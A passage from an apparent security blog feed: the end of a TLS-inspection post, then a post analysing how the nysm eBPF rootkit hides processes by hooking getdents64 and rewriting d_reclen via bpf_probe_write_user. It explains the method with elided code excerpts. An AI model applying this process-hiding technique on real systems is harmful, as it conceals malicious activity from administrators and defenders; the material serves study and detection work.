</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Reading Plaintext Buffer Reference<br><br></span>
<h2 id="5-conclusion">5. Conclusion</h2>
<p>In short, you&rsquo;ve learned how to inspect TLS messages by setting appropriate breakpoints in <em>SSL_read()</em> and <em>SSL_write()</em>.
I sure hope this short exercise has been fun and enlightening! Keep reading and stay curious.</p>
<h2 id="6-resources">6. Resources</h2>
<ol>
<li><a href="/posts/sniffing-ssl-connections-in-memory/resources/libssl-example.zip">libssl-example.zip</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>eBPF Malware Techniques Part 4 - Hiding Processes</title>
            <link>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-4-hiding-processes/</link>
            <pubDate>Fri, 09 May 2025 08:16:42 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-4-hiding-processes/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;In this post, we explore techniques employed by eBPF to hide processes. When I wrote my first rootkit that hides targeted directories, my go-to reference was this well-written &lt;a href=&#34;https://xcellerator.github.io/posts/linux_rootkits_06/&#34;&gt;blog post&lt;/a&gt; by &lt;a href=&#34;https://github.com/xcellerator&#34;&gt;TheXcellerator&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As PIDs are tracked under &lt;em&gt;/proc&lt;/em&gt; as a directory, there&amp;rsquo;s no need to re-invent the wheel when it comes to hiding processes. That’s because Linux veterans know that directory listings are handled by the getdents64 syscall — a well-known technique.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>In this post, we explore techniques employed by eBPF to hide processes. When I wrote my first rootkit that hides targeted directories, my go-to reference was this well-written <a href="https://xcellerator.github.io/posts/linux_rootkits_06/">blog post</a> by <a href="https://github.com/xcellerator">TheXcellerator</a>.</p>
<p>As PIDs are tracked under <em>/proc</em> as a directory, there&rsquo;s no need to re-invent the wheel when it comes to hiding processes. That’s because Linux veterans know that directory listings are handled by the getdents64 syscall — a well-known technique.</p>
<p>However, if you are still relatively new to Linux&rsquo;s internals, the next section will provide clarity on how the <em>getdents64</em> syscall works.</p>
<h2 id="2-what-is-getdents64-syscall">2. What is getdents64 Syscall?</h2>
<p>You can reliably learn about this syscall from its man page (<code>man getdents64</code>). In addition, we can also search up the function definition in the Linux kernel source code <a href="">here</a> to see its parameters.</p>
<p>Essentially, the function prototype of <em>getdents64()</em> looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getdents64</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>dirp, <span style="color:#66d9ef">int</span> count)
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Function Prototype of <em>getdents64()</em><br><br></span>
<p>This function takes in 3 parameters:</p>
<ol>
<li><code>int fd</code>: The file descriptor of the directory to read.</li>
<li><code>struct linux_dirent64 *dirp</code>: A pointer to a buffer where the directory entries will be stored.</li>
<li><code>int count</code>: The size of the buffer in bytes.</li>
</ol>
<p>And it returns the number of bytes read into the buffer, or -1 on error.</p>
<p>To dive slightly deeper, let&rsquo;s break down <code>struct linux_dirent64</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> linux_dirent64 {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ino64_t</span>        d_ino;    <span style="color:#75715e">// Inode number
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">off64_t</span>        d_off;    <span style="color:#75715e">// Offset to the next dirent
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> d_reclen; <span style="color:#75715e">// Length of this record
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  d_type;   <span style="color:#75715e">// File type (e.g., DT_DIR, DT_REG)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span>           d_name[]; <span style="color:#75715e">// Null-terminated filename
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Definition of <em>linux_dirent64</em> Structure<br><br></span>
<p>This structure represents a single directory entry and has 5 members in the structure:</p>
<ol>
<li><code>ino64_t d_ino</code>: The inode number of the file.</li>
<li><code>off64_t d_off</code>: The offset to the next directory entry.</li>
<li><code>unsigned short d_reclen</code>: The total size of this directory entry, including the d_name field.</li>
<li><code>unsigned char d_type</code>: The type of the file (e.g., directory, regular file, symbolic link).</li>
<li><code>char d_name[]</code>: The name of the file (null-terminated string).</li>
</ol>
<p>To tie everything together, what happens is that when <em>getdents64()</em> is called, it fills the provided buffer (<em>dirp</em>) with a series of <code>struct linux_dirent64</code> entries. Each entry corresponds to a file or subdirectory and has a variable size, determined by the lengths of the <em>d_name</em> and <em>d_reclen</em> fields. The kernel then iterates through the buffer using the <em>d_reclen</em> field to locate the next directory entry.</p>
<p>Here&rsquo;s a simple example of using the getdents64 syscall to iterate through your files and subdirectories in the current working directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/syscall.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUF_SIZE 1024
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> linux_dirent64 {
</span></span><span style="display:flex;"><span>  __ino64_t        d_ino;    <span style="color:#75715e">// Inode number
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __off64_t        d_off;    <span style="color:#75715e">// Offset to the next dirent
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> d_reclen;   <span style="color:#75715e">// Length of this record
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  d_type;     <span style="color:#75715e">// File type (e.g., DT_DIR, DT_REG)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span>           d_name[];   <span style="color:#75715e">// Null-terminated filename
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;.&#34;</span>, O_RDONLY <span style="color:#f92672">|</span> O_DIRECTORY);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;open&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUF_SIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> nread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ((nread <span style="color:#f92672">=</span> <span style="color:#a6e22e">syscall</span>(SYS_getdents64, fd, buf, BUF_SIZE)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>d;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> bpos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; bpos <span style="color:#f92672">&lt;</span> nread; bpos <span style="color:#f92672">+=</span> d<span style="color:#f92672">-&gt;</span>d_reclen) {
</span></span><span style="display:flex;"><span>          d <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)(buf <span style="color:#f92672">+</span> bpos);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Name: %s, Inode: %llu, Type: %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d<span style="color:#f92672">-&gt;</span>d_name, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)d<span style="color:#f92672">-&gt;</span>d_ino, d<span style="color:#f92672">-&gt;</span>d_type);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (nread <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;getdents64&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Simple Example of Iterating Files/Directories in CWD - <em>simple_ls_cwd.c</em><br><br></span>
<h2 id="3-methodology-on-hiding-processes">3. Methodology on Hiding Processes</h2>
<p>Now that we better understand how to iterate through directory entries, we can basically do the following high-level steps to hide our processes:</p>
<ol>
<li>For each directory entry, check if the PID is our target</li>
<li>If it is, then update the previous directory entry&rsquo;s <em>d_reclen</em> to skip over the current directory entry</li>
</ol>
<p>The pseudocode below reiterates the concept:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(d_name)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> target_pid) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  previous_d_reclen <span style="color:#f92672">+=</span> current_d_reclen
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Pseudocode For Hiding Target PID<br><br></span>
<h2 id="4-github-project---eeriedusknysm">4. Github Project - eeriedusk/nysm</h2>
<p>The <em>nysm</em> project uses eBPF to hide specific PIDs from directory listings. This involves a combination of hooks and user-space logic to track, manage, and hide PIDs.</p>
<h3 id="41-tracking-pids-to-hide">4.1 Tracking PIDs to Hide</h3>
<p>The first step is to track the PIDs that need to be hidden. This is achieved through the <em>kretprobe</em> hook on <em>alloc_pid()</em>, which is triggered when a new PID is allocated.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;kretprobe/alloc_pid&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_KRETPROBE</span>(alloc_pid_exit, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ret_pid) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> upid numbers <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">!=</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>numbers, <span style="color:#66d9ef">sizeof</span>(numbers), ret_pid<span style="color:#f92672">+</span><span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> pid, numbers));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_map_update_elem</span>(<span style="color:#f92672">&amp;</span>map_alloc_pid_pid_data, <span style="color:#f92672">&amp;</span>numbers.nr, <span style="color:#f92672">&amp;</span>numbers.nr, BPF_ANY);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>Kretprobe</em> Hook on <em>alloc_pid()</em><br><br></span>
<p>According to the listing above, <em>nysm</em> only keeps track of processes that are from the same namespace. It then proceeds to update <em>map_alloc_pid_pid_data</em> only with its own PID and children process PIDs.</p>
<h3 id="42-cleaning-up-tracked-pids">4.2 Cleaning Up Tracked PIDs</h3>
<p>When a process exits, its PID is no longer valid and should be removed from the tracking map. This is handled by the <em>kprobe</em> hook on <em>free_pid()</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;kprobe/free_pid&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_KPROBE</span>(free_pid, <span style="color:#66d9ef">struct</span> pid <span style="color:#f92672">*</span>pid) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> upid numbers <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">!=</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>numbers, <span style="color:#66d9ef">sizeof</span>(numbers), pid<span style="color:#f92672">-&gt;</span>numbers);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">bpf_map_lookup_elem</span>(<span style="color:#f92672">&amp;</span>map_alloc_pid_pid_data, <span style="color:#f92672">&amp;</span>numbers.nr)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_map_delete_elem</span>(<span style="color:#f92672">&amp;</span>map_alloc_pid_pid_data, <span style="color:#f92672">&amp;</span>numbers.nr)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>Kprobe</em> Hook on <em>free_pid()</em><br><br></span>
<p>Again, <em>nysm</em> only monitors processes from the same namespace. It does a map lookup for the PID being released. If this PID exists in <em>map_alloc_pid_pid_data</em>, then it is deleted from the map.</p>
<h3 id="43-storing-directory-entries">4.3 Storing Directory Entries</h3>
<p>Now that <em>nysm</em> has a way to keep track and remove the PIDs to hide, the next step is to use a <em>tracepoint</em> hook on <em>sys_enter_getdents64</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tracepoint/syscalls/sys_enter_getdents64&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_getdents64_enter</span>(<span style="color:#66d9ef">struct</span> enter_getdents64_format <span style="color:#f92672">*</span>ctx) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>dirent <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>dirent;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> tgid <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_get_current_pid_tgid</span>() <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">==</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_map_update_elem</span>(<span style="color:#f92672">&amp;</span>map_getdents64_pid, <span style="color:#f92672">&amp;</span>tgid, <span style="color:#f92672">&amp;</span>dirent, BPF_ANY);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>Tracepoint</em> Hook on <em>sys_enter_getdents64</em><br><br></span>
<p>When a process that triggers this hook does not belong to the same namespace as <em>nysm</em>, the program stores the directory entry buffer pointer in the <em>map_getdents64_pid</em> map, associating it with the process’s tgid. This allows the buffer to be accessed later at the <em>tracepoint</em> for <em>sys_exit_getdents64</em>.</p>
<h3 id="44-processing-directory-entries">4.4 Processing Directory Entries</h3>
<p>Now that the relevant directory entries are stored in the map, processing is needed via a <em>tracepoint</em> hook on <em>sys_exit_getdents64</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define DIRENT_BPF_LOOP 128
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tracepoint/syscalls/sys_exit_getdents64&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_getdents64_exit</span>(<span style="color:#66d9ef">struct</span> exit_format <span style="color:#f92672">*</span>ctx) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">==</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_map_read_elem</span>(<span style="color:#f92672">&amp;</span>dirent_ptr, <span style="color:#66d9ef">sizeof</span>(dirent_ptr), <span style="color:#f92672">&amp;</span>map_getdents64_pid, tgid)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> DIRENT_BPF_LOOP; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>dirent, <span style="color:#66d9ef">sizeof</span>(dirent), dirent_ptr <span style="color:#f92672">+</span> data.offset);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>d_name, <span style="color:#66d9ef">sizeof</span>(d_name), ((<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)(dirent_ptr <span style="color:#f92672">+</span> data.offset))<span style="color:#f92672">-&gt;</span>d_name);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read</span>(<span style="color:#f92672">&amp;</span>d_type, <span style="color:#66d9ef">sizeof</span>(d_type), <span style="color:#f92672">&amp;</span>((<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)(dirent_ptr <span style="color:#f92672">+</span> data.offset))<span style="color:#f92672">-&gt;</span>d_type);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Trucated Code - Refer to Section 4.5 */</span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    data.old_offset <span style="color:#f92672">=</span> data.offset;
</span></span><span style="display:flex;"><span>    data.offset <span style="color:#f92672">+=</span> dirent.d_reclen;
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (data.offset <span style="color:#f92672">&lt;</span> ret) <span style="color:#a6e22e">bpf_tail_call</span>(ctx, <span style="color:#f92672">&amp;</span>map_getdents64_recursive_tail_call, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing"><em>Tracepoint</em> Hook on <em>sys_exit_getdents64</em><br><br></span>
<p>The snippet above shows that this hook iterates through and processes directory entries 128 times before doing a tail call back to the start of this <em>tracepoint</em>. This limitation exists because eBPF programs can only execute a limited number of instructions per invocation. By limiting the loop to 128 iterations, the program ensures it stays within these constraints while processing large directory buffers. The tail call mechanism allows the program to continue processing the remaining entries in subsequent invocations.</p>
<p>The configuration for the tail call is handled in <em>nysm.c</em>, where the <em>tracepoint_getdents64_exit()</em> program is added to the <em>map_getdents64_recursive_tail_call</em> hash map using a key value of 1.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int32_t</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int32_t</span> prog <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_program__fd</span>(nysm<span style="color:#f92672">-&gt;</span>progs.tracepoint_getdents64_exit);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int32_t</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_map_update_elem</span>(<span style="color:#a6e22e">bpf_map__fd</span>(nysm<span style="color:#f92672">-&gt;</span>maps.map_getdents64_recursive_tail_call), <span style="color:#f92672">&amp;</span>index, <span style="color:#f92672">&amp;</span>prog, BPF_ANY);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">goto</span> cleanup;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Configuring Tail Call in <em>nysm.c</em><br><br></span>
<h3 id="45-hiding-tracked-pids">4.5 Hiding Tracked PIDs</h3>
<p>Continuing our analysis from the truncated portion in Listing 8, the directory entry name is first converted to an integer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(d_name);
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Directory Entry Name String to Integer Conversion<br><br></span>
<p>Then it checks whether the PID exists in the <em>map_alloc_pid_pid_data</em> hash map, where it previously stored a set of PIDs that needs to be hidden. (Recall Section 4.1)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_map_lookup_elem</span>(<span style="color:#f92672">&amp;</span>map_alloc_pid_pid_data, <span style="color:#f92672">&amp;</span>pid)) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Truncated Code - See Listing 12*/</span>
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Check If PID Needs To Be Hidden<br><br></span>
<p>If this is the first hidden entry encountered (<code>data.d_reclen == 0</code>), the program calculates a <em>d_reclen</em> for the previous entry by adding the size of the current entry (<em>dirent.d_reclen</em>) to the gap between the current and previous entries (<em>data.offset - data.old_offset</em>). Then, it stores the offset of the previous entry in <em>data.change_me</em>.</p>
<p>Otherwise, for subsequent consecutive entries to be hidden, the program accumulates their sizes in <em>data.d_reclen</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>data.d_reclen) {
</span></span><span style="display:flex;"><span>    data.d_reclen  <span style="color:#f92672">=</span> (data.offset<span style="color:#f92672">-</span>data.old_offset)<span style="color:#f92672">+</span>dirent.d_reclen;
</span></span><span style="display:flex;"><span>    data.change_me <span style="color:#f92672">=</span> data.old_offset;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    data.d_reclen <span style="color:#f92672">+=</span> dirent.d_reclen;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Calculating <em>data.d_reclen</em> If Directory Entry Needs To Be Hidden<br><br></span>
<p>At the other branching statement of Listing 11 when it encounters a non-tracked PID, it checks if there are hidden entries (<code>data.d_reclen &gt; 0</code>) and if the program has stored the offset of the previous entry (<em>data.change_me</em>), it writes the updated <em>d_reclen</em> value to the previous entry in the directory entries buffer. This ultimately causes hidden entries to be skipped when the directory entries buffer is processed by user-space programs.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (data.d_reclen <span style="color:#f92672">&amp;&amp;</span> data.change_me <span style="color:#f92672">&amp;&amp;</span> d_type <span style="color:#f92672">==</span> DT_DIR) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_probe_write_user</span>(<span style="color:#f92672">&amp;</span>((<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)(dirent_ptr<span style="color:#f92672">+</span>data.change_me))<span style="color:#f92672">-&gt;</span>d_reclen, <span style="color:#f92672">&amp;</span>data.d_reclen, <span style="color:#66d9ef">sizeof</span>(data.d_reclen));
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Committing Changes to Previous Entry&rsquo;s <em>d_reclen</em><br><br></span>
<h2 id="5-conclusion">5. Conclusion</h2>
